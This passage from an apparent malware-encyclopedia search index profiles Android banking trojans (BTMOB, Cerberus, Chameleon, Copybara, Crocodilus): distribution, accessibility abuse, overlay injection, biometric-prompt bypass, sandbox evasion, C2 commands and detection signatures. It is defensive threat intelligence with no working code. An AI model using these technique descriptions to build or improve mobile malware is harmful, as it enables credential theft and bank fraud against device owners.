streaming platform) serving trojanized APKs Phishing sites (crypto) Fake cryptocurrency mining platforms distributing BTMOB as mining apps Telegram channels Direct distribution through the threat actor's Telegram presence Third-party APK sites Hosted on unofficial Android app repositories <p>The phishing sites are crafted to appear as legitimate download pages. Cyble documented a sample distributed through a site impersonating iNat TV, where the victim downloads what appears to be a streaming application. On installation, the app requests Accessibility Service permissions through a persistent prompt that loops until the user complies.</p>"},{"location":"malware/families/btmob/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/btmob/#credential-harvesting","title":"Credential Harvesting","text":"Technique Implementation WebView injection The <code>brows</code> command loads arbitrary URLs or dynamically injected HTML into an invisible WebView, driving JavaScript-based harvesting of form inputs Transparent overlays Draws transparent or semi-transparent overlays on banking and payment apps to capture credentials without the victim's awareness Accessibility keylogging Captures keystrokes across all applications via Accessibility Service event monitoring Lock screen capture Intercepts lock screen PIN/pattern input through overlay interception <p>The <code>brows</code> command is the primary credential theft mechanism. The C2 server can instruct BTMOB to load any URL or inject custom HTML into a hidden WebView, then use JavaScript to extract form field contents as the victim types. This allows operators to target any login page dynamically without pre-built overlay kits.</p>"},{"location":"malware/families/btmob/#device-control","title":"Device Control","text":"Capability Implementation Live screen streaming Media Projection API captures real-time screen content and streams to C2 Remote interaction Accessibility Service translates operator commands into taps, swipes, and text input File management Browse, download, and upload files on the device Audio recording Ambient audio capture via device microphone Device unlock Remote unlock through Accessibility-based gesture replay App management Install, uninstall, and launch applications remotely"},{"location":"malware/families/btmob/#data-collection","title":"Data Collection","text":"Category Details Clipboard monitoring Continuously monitors clipboard for cryptocurrency wallet addresses, passwords, and OTPs Device fingerprint IMEI, model, OS version, carrier info, battery status Installed applications Enumerates all packages on the device Contacts Full address book exfiltration SMS Read and intercept SMS messages for OTP theft Call logs Call history extraction Location GPS coordinates and network-based positioning"},{"location":"malware/families/btmob/#notification-and-persistence","title":"Notification and Persistence","text":"Technique Details Notification suppression Auto-hides notifications to conceal malicious activity from the user Accessibility persistence Monitors for attempts to disable Accessibility Service and re-enables it Permission auto-grant Uses Accessibility to silently grant runtime permissions without user interaction Auto-update RAT can update itself from C2 without user intervention"},{"location":"malware/families/btmob/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/btmob/#c2-communication","title":"C2 Communication","text":"<p>BTMOB uses WebSocket for real-time bidirectional communication with the C2 server, enabling persistent command-and-control without polling delays.</p> Aspect Details Protocol WebSocket for command/control, HTTP for bulk data exfiltration Authentication Bot identifies via device ID and bot ID on WebSocket connection C2 path structure Backend hosted under <code>/yaarsa/</code> directory with <code>user/</code>, <code>private/</code>, and <code>private/updates/</code> paths Operator panel BTMob.exe (Windows), authenticates via email, password, and token from the C2 web interface at <code>/yaarsa/user/</code> Endpoint signatures <code>yarsap_*.php</code> endpoints under <code>/yaarsa/private/</code> for plugin and update delivery"},{"location":"malware/families/btmob/#operator-panel","title":"Operator Panel","text":"<p>D3Lab's analysis of the leaked toolkit revealed that BTMob.exe is a graphical shell around the C2 APIs and WebSocket channels. It displays infected devices, provides real-time screen viewing, allows remote interaction, and manages command execution. The operator authenticates against the C2 web interface and receives a session token for API access.</p>"},{"location":"malware/families/btmob/#version-evolution","title":"Version Evolution","text":"Version Key Changes v2.5 Updated APK SDK to Android 14, removed sticky notifications, fixed lock screen capture, auto-grants full file access, HTML APK injection v3.0 Auto RAT updates, full permission support for Android 14/15, improved encryption, live location tracking v3.2 Improved accessibility installation method, auto-hide notifications v3.6 Monthly subscription model introduced v4.0 Latest version with expanded feature set <p>The rapid iteration cycle from v2.5 (January 2025) through v4.0 (late 2025) demonstrates active development. Each version addresses Android OS updates (particularly permission model changes in Android 14 and 15) and adds operator-requested features.</p>"},{"location":"malware/families/btmob/#accessibility-service-abuse","title":"Accessibility Service Abuse","text":"<p>BTMOB's Accessibility Service performs multiple functions simultaneously:</p> <ol> <li>Monitors foreground application changes to trigger overlay attacks</li> <li>Auto-grants runtime permissions during installation without user interaction</li> <li>Captures keystrokes across all applications</li> <li>Translates remote operator commands into on-device gestures for Device Take Over</li> <li>Prevents the user from navigating to settings to disable the service</li> <li>Reads screen content for data harvesting when overlays are not deployed</li> </ol>"},{"location":"malware/families/btmob/#target-regions","title":"Target Regions","text":"Region Distribution Method Turkey Primary target via iNat TV phishing sites Global (crypto users) Fake mining platform phishing sites Global (MaaS customers) Operators deploy against their own target regions <p>As a MaaS product, BTMOB's ultimate target set depends on the individual operator purchasing the license. The developer's own campaigns focus on Turkish users through the iNat TV lure, but purchased instances target whatever region and user base the operator chooses.</p>"},{"location":"malware/families/btmob/#notable-campaigns-and-discoveries","title":"Notable Campaigns and Discoveries","text":"<p>January 31, 2025: Cyble Research and Intelligence Labs publishes the first public analysis of BTMOB RAT v2.5, identifying approximately 15 samples and documenting distribution through phishing sites impersonating iNat TV and cryptocurrency mining platforms. CRIL establishes the SpySolr/CraxRAT lineage.</p> <p>February 2025: The Cyber Express, Security Online, and Broadcom publish follow-up coverage and detection advisories.</p> <p>2025: D3Lab publishes \"Inside BTMOB\", a deep analysis of a leaked archive containing the complete BTMOB development toolkit. The analysis documents the C2 backend structure, operator panel authentication flow, WebSocket communication patterns, and the <code>/yaarsa/</code> infrastructure signatures that enable defensive detection.</p> <p>Late 2025: BTMOB reaches v4.0 with expanded capabilities and a growing operator base. ANY.RUN tracks increasing sample submissions as the MaaS ecosystem grows.</p>"},{"location":"malware/families/btmob/#related-families","title":"Related Families","text":"Family Relationship Hook Both are Android MaaS RATs with screen streaming, remote device interaction, and WebSocket C2 communication. Hook is more mature with a larger operator base following its source code leak. BTMOB is newer and still commercially licensed. Ermac Both occupy the Android MaaS market with overlay-based credential theft and Accessibility Service abuse. Ermac focuses on banking overlays while BTMOB emphasizes WebView injection and general-purpose RAT functionality. Octo Both provide live screen streaming and remote device control for on-device fraud. Octo uses VNC-like accessibility streaming while BTMOB leverages Media Projection API. SpySolr Direct predecessor to BTMOB, sharing C2 structure and core codebase. SpySolr itself derives from CraxRAT (by threat actor EVLF)."},{"location":"malware/families/cerberus/","title":"Cerberus","text":"<p>Cerberus was the Android banking trojan whose 2020 source code leak became the single most consequential event in mobile malware history. Sold as Malware-as-a-Service (MaaS) from mid-2019 through mid-2020, it introduced a polished rental model to a market previously dominated by Anubis. When the operation collapsed and its source hit underground forums, it seeded an entire lineage of successors: Alien, Ermac, Hook, and dozens of unnamed forks that persist today.</p>"},{"location":"malware/families/cerberus/#overview","title":"Overview","text":"Attribute Details First Seen June 2019 Last Seen August 2020 (original operation) Status Source leaked September 2020, forks still active Type Banking trojan (MaaS) Attribution Russian-speaking developer(s), identity unknown Aliases Cerberus v1, Cerberus v2 Source Leaked freely on Russian-speaking underground forum after failed auction"},{"location":"malware/families/cerberus/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cerberus appeared in June 2019 when its author began advertising rental access on underground forums. The developer claimed the trojan had been used in private operations for two years prior and was written entirely from scratch rather than derived from Anubis, a claim that ThreatFabric disputed based on code structure similarities.</p> <p>The original MaaS operation ran for roughly one year. By mid-2020, internal disputes fractured the development team. In July 2020, the author put the entire project up for auction with a starting price of $50,000 and a buy-it-now price of $100,000. The package included APK source code, the admin panel, C2 server code, installation guides, setup scripts, and the active customer list. The auction failed to attract a buyer.</p> <p>In September 2020, the author released the full source code for free to premium members of a popular Russian-speaking underground forum. Kaspersky documented an immediate spike in infections across Russia and Europe as low-skill actors began deploying their own builds. This leak directly spawned the next generation: ThreatFabric identified Alien as the first notable fork even before the public leak, followed by Ermac in 2021 and Hook in 2023.</p>"},{"location":"malware/families/cerberus/#distribution","title":"Distribution","text":"<p>Cerberus reached devices through multiple channels:</p> Vector Details Smishing SMS messages with links to fake banking or utility pages that served the APK Phishing sites Typosquatted domains mimicking legitimate app download pages Google Play droppers In July 2020, Avast discovered a Cerberus dropper disguised as a Spanish currency converter (\"Calculadora de Moneda\") with over 10,000 downloads. The app behaved legitimately for several weeks before activating dropper code to fetch the banking payload. Third-party app stores APKs distributed through unofficial Android markets <p>The dropper-on-Play technique was notable: the app passed Google Play Protect checks for weeks as a genuine currency converter, then received a C2 command that activated the dropper component to silently download and install the Cerberus banking payload.</p>"},{"location":"malware/families/cerberus/#capabilities","title":"Capabilities","text":"<p>Cerberus evolved significantly between its initial release and the v2 update in early 2020.</p>"},{"location":"malware/families/cerberus/#version-1-june-2019","title":"Version 1 (June 2019)","text":"Capability Implementation Overlay attacks WebView-based injects triggered via accessibility service foreground detection SMS interception Read, send, and forward SMS for OTP theft Contact harvesting Exfiltrate contact list to C2 Keylogging Accessibility-based keystroke capture App listing Enumerate installed packages to determine relevant inject targets Device info collection IMEI, SIM info, installed apps, device model Self-protection Hide app icon, prevent uninstallation via device admin Anti-analysis (pedometer) Used the device accelerometer as a step counter; payload only activates after a threshold of physical steps is reached, defeating sandbox and emulator analysis <p>The pedometer trick was Cerberus's most distinctive evasion technique. Since automated analysis environments and emulators do not generate real accelerometer data, the step counter never increments, and the malware stays dormant.</p>"},{"location":"malware/families/cerberus/#version-2-january-2020","title":"Version 2 (January 2020)","text":"<p>ThreatFabric's \"Year of the RAT\" report documented the v2 upgrade:</p> Capability Implementation RAT (Remote Access Trojan) TeamViewer-based remote access enabling full device control Google Authenticator theft Abuses accessibility to read 2FA codes directly from the Authenticator app UI Screen lock credential theft Captures PIN codes and swipe unlock patterns via accessibility File system traversal RAT service can browse the device file system and download contents Improved C2 protocol Refactored communication protocol with updated encryption <p>The ability to steal Google Authenticator 2FA codes was significant: rather than intercepting SMS-based OTPs, Cerberus read the codes directly from the Authenticator app's UI through accessibility events, bypassing the shift away from SMS-based 2FA.</p>"},{"location":"malware/families/cerberus/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/cerberus/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>Cerberus's core functionality depends on the Android Accessibility Service. Once the user grants accessibility privileges, the malware:</p> <ol> <li>Auto-grants itself additional permissions (SMS, phone calls) without user interaction</li> <li>Monitors <code>TYPE_WINDOW_STATE_CHANGED</code> events to detect when target apps enter the foreground</li> <li>Injects WebView-based overlay screens that mimic the target app's login UI</li> <li>Logs keystrokes across all applications</li> <li>In v2, reads Google Authenticator codes and screen lock patterns</li> </ol>"},{"location":"malware/families/cerberus/#c2-communication","title":"C2 Communication","text":"<p>The C2 protocol uses HTTP POST requests to communicate with the command-and-control server. Data is encrypted before transmission. The bot registers with the C2 on first launch, sending device fingerprint data, and then polls for commands at regular intervals.</p> <p>Key C2 commands:</p> Command Action <code>push</code> Display push notification to lure user into opening an app <code>startAuthenticator2</code> Launch Google Authenticator and capture displayed codes <code>startApp</code> Open a specified application (triggers overlay) <code>getContacts</code> Exfiltrate contact list <code>getAccounts</code> Steal accounts stored on device <code>sentSMS</code> Send SMS from victim device <code>startForward</code> Forward incoming calls to attacker-specified number <code>startScreenVNC</code> (v2) Initialize RAT session"},{"location":"malware/families/cerberus/#anti-analysis","title":"Anti-Analysis","text":"Technique Method Pedometer gate Reads <code>TYPE_STEP_COUNTER</code> sensor; payload dormant until step threshold is met Emulator detection Checks build properties, SIM state, and hardware characteristics Delayed activation Play Store droppers wait weeks before activating malicious behavior String obfuscation Critical strings encrypted and resolved at runtime"},{"location":"malware/families/cerberus/#inject-architecture","title":"Inject Architecture","text":"<p>Overlay injects are HTML/CSS/JS files hosted on the C2, one per target application. When the malware detects a target app in the foreground via accessibility, it requests the corresponding inject by package name. The WebView renders the inject fullscreen over the legitimate app. Submitted credentials are POSTed back to C2.</p>"},{"location":"malware/families/cerberus/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Cerberus primarily targeted European banking customers, with inject kits covering institutions across:</p> Region Countries Western Europe Spain, France, Italy, Netherlands, UK Eastern Europe Turkey, Poland North America United States Asia-Pacific Australia, India (SBI, ICICI) <p>The MaaS model meant targeting depended on individual operators. The core team maintained inject kits for major European banks, while renters could commission custom injects for specific targets. Spanish financial institutions were particularly well-represented, consistent with the Google Play dropper campaign that exclusively targeted Spanish users.</p>"},{"location":"malware/families/cerberus/#notable-campaigns","title":"Notable Campaigns","text":"<p>June 2019: Cerberus first identified by ThreatFabric being advertised on underground forums at $2,000/month for private use or $7,000/month with the full feature set.</p> <p>January 2020: The v2 release added RAT capabilities and Google Authenticator theft. ThreatFabric covered the upgrade in their \"Year of the RAT\" report, noting Cerberus had taken over from Anubis as the dominant rented banking malware.</p> <p>July 2020: Avast discovered a Cerberus dropper on Google Play disguised as \"Calculadora de Moneda,\" a Spanish currency converter app with 10,000+ downloads.</p> <p>July 2020: The failed auction. Source code offered for $50,000-$100,000 after the team dissolved.</p> <p>August 2020: ThreatFabric published \"Alien: the story of Cerberus' demise\", documenting the project's collapse and the emergence of Alien as the first Cerberus fork.</p> <p>September 2020: Full source code leaked on underground forums. Kaspersky reported an immediate surge in infections across Russia and Europe as new actors began deploying the freely available code.</p> <p>October 2020 onward: The post-leak ecosystem. Cerberus source became the foundation for Ermac (2021), Hook (2023), and numerous unattributed variants that continue to surface. Cyble tracked campaigns like \"ErrorFather\" still deploying Cerberus-derived code as late as 2024, incorporating Domain Generation Algorithms (DGA) and updated obfuscation on top of the original codebase.</p>"},{"location":"malware/families/chameleon/","title":"Chameleon","text":"<p>Chameleon is the Android banking trojan that introduced a technique for bypassing biometric authentication prompts to force PIN entry, enabling credential capture through keylogging. Cyble first identified it in early 2023 targeting Australian and Polish users. A significantly upgraded second version, analyzed by ThreatFabric in December 2023, added the biometric bypass alongside the ability to circumvent Android 13's restricted settings protections. By mid-2024, ThreatFabric observed Chameleon expanding into Canada and broader European targeting through campaigns masquerading as CRM applications.</p>"},{"location":"malware/families/chameleon/#overview","title":"Overview","text":"Attribute Details First Seen January 2023 Last Seen Active (ongoing campaigns as of 2024) Status Active, under continued development Type Banking trojan Attribution Unknown Aliases Chameleon v1, Chameleon v2"},{"location":"malware/families/chameleon/#vendor-names","title":"Vendor Names","text":"Vendor Name ThreatFabric Chameleon Cyble Chameleon ESET Android/Spy.Banker.Chameleon Kaspersky HEUR:Trojan-Banker.AndroidOS.Chameleon Fortinet Android/Banker.Chameleon Malwarebytes Android/Trojan.Banker.Chameleon MITRE ATT&amp;CK S1083"},{"location":"malware/families/chameleon/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Chameleon is an independent family with no known code lineage to other established banking trojans. Cyble's initial analysis in April 2023 noted that while the malware used standard banking trojan techniques (overlay injection, keylogging, SMS theft), its codebase did not derive from any leaked source (Cerberus, Anubis, etc.). Cyble assessed it was in early development stages, with several commands stubbed out but not yet functional.</p> <p>The v2 release in late 2023 represented a substantial capability jump. ThreatFabric's analysis showed a malware that had matured rapidly, adding technically sophisticated features like the biometric bypass and Android 13 restricted settings circumvention.</p>"},{"location":"malware/families/chameleon/#distribution","title":"Distribution","text":"<p>Chameleon uses multi-stage delivery chains, with Zombinder playing a key role in the v2 distribution.</p> Vector Details Fake Chrome APKs Both v1 and v2 samples frequently masquerade as Google Chrome Zombinder DaaS v2 distributed via Zombinder, a dropper-as-a-service that binds malicious payloads to legitimate apps. ThreatFabric noted Zombinder samples deploying Chameleon alongside Hook. Compromised websites Lure pages mimicking legitimate download portals Discord attachments Malicious APKs shared through Discord channels Bitbucket hosting APKs hosted on Bitbucket repositories for download Fake CRM apps 2024 campaign used CRM app lures targeting hospitality sector employees"},{"location":"malware/families/chameleon/#zombinder-delivery-chain","title":"Zombinder Delivery Chain","text":"<p>The v2 delivery via Zombinder follows a two-stage process:</p> <ol> <li>Victim installs a seemingly legitimate app that has been bound with a Zombinder dropper</li> <li>Dropper bypasses Android 13+ restricted settings and deploys Chameleon as a secondary payload</li> <li>Chameleon activates and requests accessibility permissions</li> </ol>"},{"location":"malware/families/chameleon/#crm-campaign-2024","title":"CRM Campaign (2024)","text":"<p>ThreatFabric's July 2024 report documented a campaign targeting employees of an international Canadian restaurant chain. The dropper displayed a fake CRM login page requesting an employee ID, then prompted a \"reinstall\" that was actually the Chameleon payload. The CRM theme was chosen specifically to target B2C employees likely to have access to corporate banking.</p>"},{"location":"malware/families/chameleon/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/chameleon/#version-1-january-2023","title":"Version 1 (January 2023)","text":"<p>Cyble documented v1 as functional but still in development:</p> Capability Implementation Overlay attacks Inject phishing pages over target banking and crypto apps Keylogging Accessibility service based keystroke capture SMS theft Intercept and exfiltrate SMS messages for OTP capture Cookie theft Steal cookies from the device browser Contact harvesting Exfiltrate device contacts App listing Enumerate installed packages Self-protection Disable Google Play Protect, prevent uninstallation Stubbed commands Several bot commands present in code but not yet implemented"},{"location":"malware/families/chameleon/#version-2-december-2023","title":"Version 2 (December 2023)","text":"<p>ThreatFabric's v2 analysis revealed two headline features:</p> Capability Implementation Biometric prompt bypass Forces device to fall back from fingerprint/face unlock to PIN/pattern entry, enabling capture via keylogger Android 13 restricted settings bypass Displays an HTML page guiding the user to enable accessibility on devices enforcing Android 13's restricted settings Device takeover (DTO) Full device control via accessibility for on-device fraud Task scheduling Improved job scheduling for persistent operation Expanded targeting Added UK and Italian banking apps to overlay targets"},{"location":"malware/families/chameleon/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/chameleon/#biometric-authentication-bypass","title":"Biometric Authentication Bypass","text":"<p>Chameleon v2's most significant technique targets the biometric authentication prompt. The implementation:</p> <ol> <li>Uses the <code>KeyguardManager</code> API to assess device lock screen status</li> <li>Monitors <code>AccessibilityEvent</code> data to detect when a biometric prompt (fingerprint, face) is displayed</li> <li>Issues an accessibility action to dismiss the biometric prompt</li> <li>Device falls back to PIN, pattern, or password authentication</li> <li>Keylogger captures the entered PIN/pattern/password</li> </ol> <p>The stolen PIN serves two purposes: it enables the operators to unlock the device at will during remote access sessions, and the credentials themselves are valuable since biometric data cannot be extracted through keylogging but PINs can.</p>"},{"location":"malware/families/chameleon/#android-13-restricted-settings-bypass","title":"Android 13 Restricted Settings Bypass","text":"<p>Android 13 introduced \"restricted settings\" that block sideloaded apps from requesting accessibility service and notification listener permissions. Chameleon v2 counters this by displaying an HTML instruction page that walks the victim through manually enabling accessibility for the app via Settings, step by step. The page mimics a legitimate system prompt.</p>"},{"location":"malware/families/chameleon/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>Once accessibility is granted, Chameleon v2 operates with the standard banking trojan pattern with several additions:</p> <ol> <li>Auto-grants additional permissions without user interaction</li> <li>Monitors foreground app changes via <code>TYPE_WINDOW_STATE_CHANGED</code></li> <li>Triggers overlay injection for target banking apps</li> <li>Captures keystrokes globally, including PIN/pattern entry</li> <li>Dismisses biometric prompts to force PIN fallback</li> <li>Disables Google Play Protect to prevent detection</li> <li>Prevents navigation to app settings to block uninstallation</li> </ol>"},{"location":"malware/families/chameleon/#c2-communication","title":"C2 Communication","text":"<p>Chameleon communicates with its C2 over HTTP. The bot:</p> <ul> <li>Registers with device fingerprint on first launch</li> <li>Retrieves target application list and inject URLs</li> <li>Polls for commands at regular intervals</li> <li>Exfiltrates captured credentials, SMS, and cookies</li> </ul>"},{"location":"malware/families/chameleon/#anti-analysis","title":"Anti-Analysis","text":"Technique Method Emulator detection Checks device properties and sensor availability Zombinder packing v2 delivered through DaaS packer to evade static detection Play Protect disabling Actively disables Google Play Protect on infection Dynamic payloads Dropper retrieves actual payload post-installation"},{"location":"malware/families/chameleon/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Chameleon's geographic scope expanded with each version iteration.</p> Version Regions Target Types v1 (Jan 2023) Australia, Poland Banking apps, cryptocurrency apps (CoinSpot), government agency impersonation v2 (Dec 2023) Australia, Poland, UK, Italy European banking apps, expanded crypto targeting CRM campaign (Jul 2024) Canada, Europe Hospitality sector corporate banking, B2C employee targeting <p>Australian and Polish institutions were the original and most consistent targets. The v2 expansion into the UK and Italy aligned with distribution through Zombinder, which has a broad European operator base.</p>"},{"location":"malware/families/chameleon/#notable-campaigns","title":"Notable Campaigns","text":"<p>January 2023: Chameleon first observed in the wild, targeting Australian and Polish users. Samples impersonated the CoinSpot cryptocurrency app, Australian government agencies, and the Polish IKO banking app.</p> <p>April 2023: Cyble published the initial discovery analysis, documenting the malware's capabilities, distribution through compromised websites and Discord, and assessment that it was still in early development.</p> <p>December 2023: ThreatFabric published the v2 analysis revealing the biometric bypass and Android 13 restricted settings circumvention. Distribution via Zombinder was confirmed, with samples masquerading as Google Chrome. Targeting expanded to UK and Italian banking customers.</p> <p>July 2024: ThreatFabric reported a new campaign targeting hospitality sector employees in Canada and Europe through fake CRM applications. The campaign used multi-stage droppers that displayed a fake CRM login page before deploying Chameleon. This marked a shift toward targeting corporate banking access rather than individual consumers.</p>"},{"location":"malware/families/copybara/","title":"Copybara","text":"<p>Copybara is an Italian-focused Android banking trojan distributed primarily through Telephone-Oriented Attack Delivery (TOAD), where operators use voice phishing (vishing) to guide victims into installing the malware. Cleafy first identified the family in November 2021. ThreatFabric clarified its relationship to the broader BRATA ecosystem in mid-2022, establishing that Copybara, while sharing the B4A development framework with BRATA and AmexTroll, is a distinct family with its own codebase, C2 protocol, and operational focus. Later variants adopted the MQTT protocol for command-and-control, analyzed in depth by Zscaler ThreatLabz and ThreatFabric.</p>"},{"location":"malware/families/copybara/#overview","title":"Overview","text":"Attribute Details First Seen November 2021 Last Seen Active (ongoing campaigns) Status Active, under continued development Type Banking trojan with On-Device Fraud (ODF) Attribution Unknown; operations concentrated against Italian financial sector Aliases CopyBara, BRATA variant (misattribution) Development Tool B4A (Basic4Android) framework C2 Protocol MQTT (latest variants), HTTP (earlier variants)"},{"location":"malware/families/copybara/#vendor-names","title":"Vendor Names","text":"Vendor Name Cleafy Copybara ThreatFabric Copybara Zscaler Copybara Kaspersky HEUR:Trojan-Banker.AndroidOS.Copybara ESET Android/Spy.Banker.Copybara Trend Micro AndroidOS_Copybara Dr.Web Android.BankBot.Copybara Malwarebytes Android/Trojan.Banker.Copybara"},{"location":"malware/families/copybara/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric's \"BRATA: a tale of three families\" analysis resolved significant naming confusion in the security community. What researchers had collectively labeled \"BRATA\" was actually three separate families:</p> Family Relationship Distinguishing Feature BRATA Original family Brazilian origin, factory reset capability AmexTroll Related but distinct Expanded to UK/Australian targets, \"black overlay\" technique Copybara Related but distinct Italian focus, MQTT-based C2, TOAD distribution <p>All three families share the B4A (Basic4Android) development framework, which became free in February 2020. ThreatFabric observed Copybara and AmexTroll being distributed simultaneously through different channels in the first half of 2022, confirming they are separate operations rather than sequential versions of the same malware. The families differ in code implementation, scope, and likely operators.</p> <p>Copybara's evolution tracks from late 2021 through multiple updates. The November 2023 variant documented by Zscaler introduced MQTT-based C2 communication, replacing earlier HTTP protocols with a lightweight messaging protocol optimized for persistent bidirectional communication.</p>"},{"location":"malware/families/copybara/#distribution","title":"Distribution","text":"<p>Copybara's distribution is defined by TOAD: the combination of social engineering phishing with live voice calls to guide victims through installation.</p> Vector Details Smishing Initial contact via SMS spoofed to appear from the victim's bank, containing a link to a phishing page that collects contact details Vishing (TOAD) Attacker calls the victim, posing as bank support, and instructs them to download a \"security application\" Fake banking apps APKs disguised with legitimate bank logos and authentic-sounding names: \"Caixa Sign Nueva,\" \"BBVA Codigo,\" \"Sabadell Codigo\" Phishing websites Landing pages that mimic bank portals, used to collect personal information before the vishing call"},{"location":"malware/families/copybara/#toad-attack-flow","title":"TOAD Attack Flow","text":"<p>ThreatFabric's TOAD analysis documented the full attack chain:</p> <ol> <li>Victim receives SMS appearing to be from their bank with a link to a phishing page</li> <li>Victim enters personal information and contact details on the phishing page</li> <li>Attacker calls the victim, impersonating bank support, referencing the information just entered</li> <li>Caller instructs the victim to download and install a \"security app\" to protect their account</li> <li>Caller guides the victim through granting accessibility and other permissions</li> <li>Copybara activates, giving the operator remote access to the device</li> <li>Operator performs On-Device Fraud via the victim's banking app</li> </ol> <p>The vishing component is essential to Copybara's success: the live caller builds trust, creates urgency, and walks the victim past every permission prompt and sideloading warning that would otherwise stop the installation.</p>"},{"location":"malware/families/copybara/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/copybara/#core-capabilities","title":"Core Capabilities","text":"Capability Implementation On-Device Fraud (ODF) Remote control of victim device for direct banking transactions via accessibility service Remote device control Full VNC-style interaction for navigating banking apps, initiating transfers Overlay attacks Credential phishing overlays impersonating banking and cryptocurrency apps Keylogging Accessibility-based keystroke capture across all applications Audio recording Record ambient audio via device microphone Video recording Capture device screen activity SMS interception Read and forward SMS for OTP capture Screen capture Capture screenshots during fraud operations Credential theft Phishing pages for banking and cryptocurrency exchange logins"},{"location":"malware/families/copybara/#mqtt-variant-november-2023","title":"MQTT Variant (November 2023)","text":"<p>Zscaler's technical analysis documented 59 supported bot commands in the MQTT-based variant:</p> Category Details Communication MQTT protocol on port 52997, subscribing to <code>commands_FromPC</code> queue Device control Remote tap, swipe, type, navigate, screenshot Data exfiltration SMS, contacts, accounts, installed apps, browser cookies Persistence Disable battery optimization, run as foreground service, prevent uninstallation Fraud Overlay injection, keylogging, OTP interception, screen lock credential capture"},{"location":"malware/families/copybara/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/copybara/#mqtt-command-and-control","title":"MQTT Command-and-Control","text":"<p>The shift from HTTP to MQTT in the November 2023 variant represents a significant architectural change. MQTT (Message Queuing Telemetry Transport) is a lightweight publish/subscribe messaging protocol designed for IoT and constrained environments:</p> <ul> <li>The malware connects to an MQTT broker on port 52997</li> <li>Subscribes to a <code>commands_FromPC</code> queue for receiving operator commands</li> <li>Publishes stolen data and status updates to separate queues</li> <li>Persistent connection enables real-time bidirectional communication without HTTP polling overhead</li> <li>Connection remains open for the duration of the fraud session</li> </ul> <p>MQTT offers operational advantages over HTTP for banking fraud: lower latency for interactive remote control sessions, reduced network overhead, and persistent connections that survive brief network interruptions.</p>"},{"location":"malware/families/copybara/#accessibility-abuse","title":"Accessibility Abuse","text":"<p>Copybara's On-Device Fraud depends on Android's accessibility service:</p> <ol> <li>Victim grants accessibility during TOAD-guided installation</li> <li>Malware auto-grants additional permissions (SMS, phone, storage, microphone)</li> <li>Monitors foreground application changes for overlay triggering</li> <li>Provides remote control functionality for operator-driven fraud</li> <li>Captures keystrokes and screen content during banking sessions</li> <li>Prevents navigation to settings to block uninstallation</li> </ol>"},{"location":"malware/families/copybara/#overlay-phishing-pages","title":"Overlay Phishing Pages","text":"<p>Zscaler documented that Copybara downloads phishing pages from C2 that impersonate popular cryptocurrency exchanges and financial institutions. The pages use legitimate logos and application names to convince victims entering credentials. Overlay injection is triggered when the accessibility service detects a target app entering the foreground.</p>"},{"location":"malware/families/copybara/#b4a-framework","title":"B4A Framework","text":"<p>Like BRATA and AmexTroll, Copybara is built using the B4A (Basic4Android) development framework. B4A uses a BASIC-like language and generates standard Android APKs. The framework produces a recognizable code structure in decompiled output, which aided ThreatFabric in identifying the relationship between the three families.</p>"},{"location":"malware/families/copybara/#anti-analysis","title":"Anti-Analysis","text":"Technique Method String obfuscation Sensitive strings encrypted and resolved at runtime Emulator detection Checks build properties and hardware characteristics Locale check Verifies device language/region matches Italian or Spanish targets Dynamic payloads Overlay pages and configuration retrieved from C2 post-installation"},{"location":"malware/families/copybara/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Copybara maintains a narrow geographic focus centered on Italian and Spanish financial institutions.</p> Region Details Italy Primary target, majority of all observed campaigns Spain Secondary target, fake apps impersonating BBVA, Caixa, Sabadell UK Targeted in cross-campaign activity documented by Cleafy <p>Cleafy's fraud campaign analysis documented campaigns from late 2023 through early 2024 targeting Italian, Spanish, and UK banking customers. The stolen funds were transferred to a well-organized network of money mule accounts via instant payment systems.</p> <p>Italian banks remain the core focus. The TOAD distribution method requires Italian-speaking (or Spanish-speaking) operators who can convincingly impersonate bank support staff, which naturally constrains the geographic scope.</p>"},{"location":"malware/families/copybara/#notable-campaigns","title":"Notable Campaigns","text":"<p>November 2021: Copybara first identified by Cleafy, targeting Italian banking customers through phishing sites and early TOAD delivery methods.</p> <p>First half 2022: ThreatFabric observes Copybara and AmexTroll distributed simultaneously through different channels, confirming they are separate families despite shared B4A framework lineage.</p> <p>October 2022: ThreatFabric publishes TOAD fraud analysis, documenting the full vishing attack chain used to deploy Copybara against Italian banking customers. The research details how operators combine phishing sites with live phone calls to guide victims through installation and permission granting.</p> <p>November 2023: The MQTT variant emerges. Zscaler ThreatLabz publishes technical analysis documenting 59 bot commands and the shift from HTTP to MQTT-based C2 communication.</p> <p>Late 2023 - Early 2024: Cleafy intercepts an active fraud campaign against UK, Spanish, and Italian banking customers. The full fraud chain is traced from initial social engineering to fraudulent wire transfers routed through money mule networks. The campaign uses both smishing and vishing to distribute Copybara, with fake apps impersonating Spanish banks including BBVA, Caixa, and Sabadell.</p>"},{"location":"malware/families/crocodilus/","title":"Crocodilus","text":"<p>Crocodilus is a device-takeover Android banking trojan that ThreatFabric discovered in March 2025 targeting banks and cryptocurrency wallets in Spain and Turkey. Unlike many newcomers that iterate from leaked source code or simple forks, Crocodilus arrived as a fully mature threat with remote control, black screen overlays, an accessibility logger that captures every screen element, and a novel contact list injection technique that plants fake \"Bank Support\" entries on the victim's phone to enable convincing vishing calls. By June 2025, ThreatFabric reported that Crocodilus had expanded to eight countries and added automated cryptocurrency seed phrase harvesting, confirming its trajectory as one of the fastest-evolving mobile threats of the year.</p>"},{"location":"malware/families/crocodilus/#overview","title":"Overview","text":"Attribute Details First Seen March 2025 Status Active, rapidly expanding globally Type Banking trojan, device takeover, MaaS Attribution Unknown Distribution Proprietary dropper bypassing Android 13+ restrictions"},{"location":"malware/families/crocodilus/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Crocodilus has no known code lineage to existing Android banking trojan families. ThreatFabric's initial analysis emphasized that the malware 